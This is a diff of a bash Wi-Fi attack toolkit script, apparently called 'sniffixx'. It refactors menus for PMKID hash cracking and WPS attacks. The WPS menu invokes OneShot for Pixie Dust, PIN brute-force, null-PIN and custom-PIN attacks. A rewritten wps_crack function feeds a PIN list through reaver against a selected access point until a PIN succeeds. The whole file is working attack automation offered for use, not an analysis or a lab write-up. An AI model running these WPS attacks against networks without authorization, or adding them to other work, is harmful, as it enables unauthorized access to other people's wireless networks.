@@ -498,6 +498,8 @@ convert_selected_pmkid() {
 }
 
 # Function to crack PMKID hashes with interactive selection
+# NOTE: WPS functions are defined AFTER this to maintain logical flow
+
 pmkid_crack_menu() {
     local hash_dir="$workdir/dump/22000"
     local john_dir="$workdir/dump/22000/john"
@@ -579,30 +581,39 @@ pmkid_crack_menu() {
         ;;
 
     4)
-     # WPS Pixie Dust/Force
+        echo "Returning to wordlist selection..."
+        ;;
+    5)
+        echo "Returning to main menu."
+        ;;
+    *)
+        echo "❌ Invalid option."
+        ;;
+    esac
+}
+
+# WPS Attack Environment - Pixie Dust Menu
 pixie_dust_menu() {
-  echo "Preparing for WPS Attacks..."
-  sleep 1
-  echo
-  echo "Checking adapter..."
-  echo
-  if [[ "$adapter" != "wlan2" && "$adapter" != "wlan3" ]]; then
-    
-    echo "internal adapter in use."
-    echo "If your internal adapter is currently in monitor mode, please head to another shell instance and disable it first, then press Enter to continue..."
-    read
+    echo "Preparing for WPS Attacks..."
+    sleep 1
+    echo ""
+    echo "Checking adapter..."
+    echo ""
+    if [[ "$adapter" != "wlan2" && "$adapter" != "wlan3" ]]; then
+        echo "internal adapter in use."
+        echo "If your internal adapter is currently in monitor mode, please head to another shell instance and disable it first, then press Enter to continue..."
+        read
     else
-    echo "external adapter detected."
-    echo "Disabling monitor mode..."
-  airmon-ng stop "$adapter"
-  clear
-fi
-  echo "Executing WPS-Attack-Environment"
-  
-  check_oneshot || { echo "WPS attacks unavailable."; return 1; }
-  
-  # wps attacks selection
-  while true; do 
+        echo "external adapter detected."
+        echo "Disabling monitor mode..."
+        airmon-ng stop "$adapter"
+        clear
+    fi
+    echo "Executing WPS-Attack-Environment"
+    
+    check_oneshot || { echo "WPS attacks unavailable."; return 1; }
+    
+    while true; do
         echo ""
         echo "Choose attack option"
         echo "1. Pixie Dust"
@@ -614,61 +625,58 @@ fi
         echo "7. Loop Mode"
         echo "8. Special Brute Force (PIN file)"
         echo "9. Back to main menu"
-
+        
         read -p "Choose an option: " option
-
+        
         case $option in
             1)
                 if [ -z "$adapter" ]; then
                     echo "No adapter selected. Please select a Wi-Fi adapter first."
                 else
-                     python3 "$SNX_ONESHOT" -w -i "$adapter" -K
+                    python3 "$SNX_ONESHOT" -w -i "$adapter" -K
                 fi
                 ;;
             2)
                 if [ -z "$adapter" ]; then
                     echo "No adapter selected. Please select a Wi-Fi adapter first."
                 else
-                      python3 "$SNX_ONESHOT" -w -i "$adapter" -F
+                    python3 "$SNX_ONESHOT" -w -i "$adapter" -F
                 fi
                 ;;
             3)
                 if [ -z "$adapter" ]; then
                     echo "No adapter selected. Please select a Wi-Fi adapter first."
                 else
-                      python3 "$SNX_ONESHOT" -w -i "$adapter" -B
+                    python3 "$SNX_ONESHOT" -w -i "$adapter" -B
                 fi
                 ;;
             4)
                 if [ -z "$adapter" ]; then
                     echo "No adapter selected. Please select a Wi-Fi adapter first."
                 else
-                      python3 "$SNX_ONESHOT" -w -i "$adapter" -p 00000000
+                    python3 "$SNX_ONESHOT" -w -i "$adapter" -p 00000000
                 fi
                 ;;
             5)
                 if [ -z "$adapter" ]; then
                     echo "No adapter selected. Please select a Wi-Fi adapter first."
                 else
-                      # specify custom Pin
-                      read -p "Enter an 8-digit pin: " cuspin
-                      python3 "$SNX_ONESHOT" -w -i "$adapter" -p "$cuspin"
+                    read -p "Enter an 8-digit pin: " cuspin
+                    python3 "$SNX_ONESHOT" -w -i "$adapter" -p "$cuspin"
                 fi
                 ;;
             6)
                 if [ -z "$adapter" ]; then
                     echo "No adapter selected. Please select a Wi-Fi adapter first."
                 else
-                      python3 "$SNX_ONESHOT" --vuln-list=vulnwsc.txt -w -i "$adapter"
+                    python3 "$SNX_ONESHOT" --vuln-list=vulnwsc.txt -w -i "$adapter"
                 fi
                 ;;
             7)
                 if [ -z "$adapter" ]; then
                     echo "No adapter selected. Please select a Wi-Fi adapter first."
                 else
-               # export adapter=$adapter
-                 #   ./usr/local/bin/auto_select.exp
-                 python3 "$SNX_ONESHOT" --vuln-list=vulnwsc.txt -w -i "$adapter" -l
+                    python3 "$SNX_ONESHOT" --vuln-list=vulnwsc.txt -w -i "$adapter" -l
                 fi
                 ;;
             8)
@@ -684,6 +692,7 @@ fi
     done
 }
 
+# Special Brute Force using PIN file
 special_bruteforce_menu() {
     if [[ -z "$adapter" ]]; then
         echo "No adapter selected. Please select a Wi-Fi adapter first."
@@ -744,35 +753,6 @@ special_bruteforce_menu() {
         *)
             echo "Invalid choice"
             ;;
-    esac
-}
-
-while true; do
-      echo "📤 Check installed wordlists"
-      echo "++++++++++++++++++++++"
-      echo "Copy the path of your preferred wordlist, go back to cracking tool selection and paste it when asked for a wordlist."
-      echo "Hint: To go back to the menu, type 'exit' in the shell!"
-      echo
-      echo "1. Wordlists"
-      echo "2. Seclists"
-      echo "X. Back to tool selection"
-      read -p "Select kali wordlist path: " wordl
-      case $wordl in 
-         1) ( wordlists ) ;;  # subshell prevents breaking the loop
-         2) ( seclists ) ;;
-         x|X) echo "Returning to cracking tool selection"; break ;;
-           *) echo "Invalid option." ;;
-esac
-     done
-        ;;
-
-    5)
-        echo "Returning to main menu."
-        ;;
-
-    *)
-        echo "❌ Invalid option."
-        ;;
     esac
 }
 
@@ -892,39 +872,40 @@ scan_wps_networks() {
     echo -e "${green}Selected ESSID:${nc} $selected_essid"
 }
 
-# Call the function
-
-
+# WPS Crack using selected network
 wps_crack() {
-# Variables
-#adapter="wlanX"  # Replace with chosen adapter
-target_bssid=$selected_bssid  # Replace with chosen AP BSSID
-pin_file="/sniffixx/wps_pins.txt"  # List of PINs
-timeout_duration=10  # Time in seconds for each attempt
-
-# Function to brute-force WPS PINs
-#wps_bruteforce() {
-    echo "Starting WPS brute-force attack..."
+    if [[ -z "$adapter" ]]; then
+        echo "No adapter selected. Please select a Wi-Fi adapter first."
+        return 1
+    fi
+    
+    local target_bssid="$selected_bssid"
+    local pin_file="/sniffixx/wps_pins.txt"
+    local timeout_duration=10
+    
+    if [ -z "$target_bssid" ]; then
+        echo "No network selected. Please select a network first."
+        return 1
+    fi
+    
+    if [ ! -f "$pin_file" ]; then
+        echo "PIN file not found: $pin_file"
+        return 1
+    fi
+    
+    echo "Starting WPS brute-force attack on $target_bssid..."
     while IFS= read -r pin; do
         echo "Trying PIN: $pin"
-
-        # Run Reaver with timeout and capture output
         output=$(timeout "$timeout_duration" reaver -i "$adapter" -b "$target_bssid" -p "$pin" -vv 2>&1)
-
-        # Check for success indicators (modify based on Reaver output messages)
         if echo "$output" | grep -q "WPS transaction completed successfully"; then
             echo "Success! Correct PIN found: $pin"
-            echo "Stopping attack..."
             break
         fi
-
         echo "PIN $pin failed, moving to next..."
     done < "$pin_file"
 }
-# Start WPS brute-force
-#wps_bruteforce
 
-# handshakde grabber
+# Handshake grabber
 handshake_grabber_menu() {
     while true; do
         echo -e "${yellow}Handshake Grabber Menu${nc}"
